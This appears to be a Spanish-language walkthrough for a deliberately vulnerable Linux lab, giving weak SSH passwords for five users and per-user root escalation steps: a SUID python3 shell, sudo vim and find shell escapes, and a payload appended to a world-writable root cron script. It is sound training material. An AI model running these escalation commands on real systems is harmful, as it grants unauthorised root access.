¿Cómo funciona este laboratorio?

Conéctate por SSH usando cualquiera de los 5 usuarios del sistema. Cada uno tiene un vector de escalada de privilegios distinto. El objetivo es conseguir acceso root y leer /root/root.txt.

El usuario admin tiene sudo completo — úsalo para inspeccionar la máquina: permisos SUID, sudoers, cron jobs...

Conexión SSH
# Conectar por SSH — reemplaza TARGET_IP por la IP del laboratorio
ssh admin@TARGET_IP # contraseña: password1 (sudo completo)
ssh alice@TARGET_IP # contraseña: Password1
ssh bob@TARGET_IP # contraseña: welcome1
ssh charlie@TARGET_IP # contraseña: changeme
ssh dave@TARGET_IP # contraseña: P@ssw0rd
admin — sudo sin restricciones Reconocimiento

El usuario admin tiene acceso NOPASSWD: ALL en sudoers. Usa estas técnicas para inspeccionar y entender los vectores de los demás usuarios.

# 1. Conectar
ssh admin@TARGET_IP
# 2. Escalar a root
sudo su
# 3. Leer flag
cat /root/root.txt
# --- Comandos de reconocimiento ---
sudo cat /etc/sudoers.d/* # ver privilegios de cada usuario
find / -perm -4000 -type f 2>/dev/null # buscar binarios SUID
cat /etc/cron.d/* # ver cron jobs del sistema
ls -la /opt/scripts/ # ver scripts del sistema
alice — SUID en python3 High

El binario /usr/bin/python3 tiene el bit SUID activado. Esto permite ejecutar código como root desde una sesión de usuario sin privilegios.

Pista: usa find / -perm -4000 para descubrir el binario SUID
# 1. Conectar
ssh alice@TARGET_IP # password: Password1
# 2. Descubrir binarios SUID
find / -perm -4000 -type f 2>/dev/null
# → /usr/bin/python3
# 3. Escalar con python3 SUID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Verificar
id
# → uid=0(root)
# 4. Leer flag
cat /root/root.txt
bob — sudo misconfiguration (vim) High

La política de sudo permite a bob ejecutar vim como root sin contraseña. Vim puede lanzar una shell hija con privilegios de root — técnica documentada en GTFOBins.

Pista: ejecuta sudo -l para ver qué puede hacer bob
# 1. Conectar
ssh bob@TARGET_IP # password: welcome1
# 2. Ver privilegios sudo
sudo -l
# → (ALL) NOPASSWD: /usr/bin/vim
# 3. Escalar via GTFOBins — vim
sudo vim -c ':!/bin/bash'
# Alternativas:
sudo vim -c ':set shell=/bin/bash' -c ':shell'
sudo vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
# 4. Verificar y leer flag
id
cat /root/root.txt
charlie — Cron job world-writable Critical

Existe un script ejecutado por root cada minuto vía cron (/opt/scripts/cleanup.sh), pero sus permisos son 777 (world-writable). Cualquier usuario puede modificarlo.

Pista: lee el archivo note.txt en el home de charlie y revisa /etc/cron.d/
# 1. Conectar
ssh charlie@TARGET_IP # password: changeme
# 2. Seguir la pista
cat ~/note.txt
# → Tip: check what runs automatically on this system...
# 3. Buscar cron jobs del sistema
cat /etc/cron.d/*
# → * * * * * root /opt/scripts/cleanup.sh
# 4. Comprobar permisos del script
ls -la /opt/scripts/cleanup.sh
# → -rwxrwxrwx root root (world-writable!)
# 5. Inyectar payload (copia bash con SUID)
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
# 6. Esperar hasta el próximo minuto y escalar
watch -n 5 ls -la /tmp/rootbash # esperar a que aparezca
/tmp/rootbash -p
# 7. Verificar y leer flag
id
# → euid=0(root)
cat /root/root.txt
El cron se ejecuta cada minuto — puede tardar hasta 60 segundos en aparecer /tmp/rootbash.
dave — sudo misconfiguration (find) High

La política de sudo permite a dave ejecutar find como root sin contraseña. find puede ejecutar comandos arbitrarios en archivos encontrados — técnica documentada en GTFOBins.

Pista: ejecuta sudo -l para ver qué puede hacer dave
# 1. Conectar
ssh dave@TARGET_IP # password: P@ssw0rd
# 2. Ver privilegios sudo
sudo -l
# → (ALL) NOPASSWD: /usr/bin/find
# 3. Escalar via GTFOBins — find
sudo find . -exec /bin/bash \; -quit
# Alternativas:
sudo find / -name root.txt -exec /bin/bash \; -quit
sudo find . -maxdepth 0 -exec /bin/bash -p \;
# 4. Verificar y leer flag
id
# → uid=0(root)
cat /root/root.txt
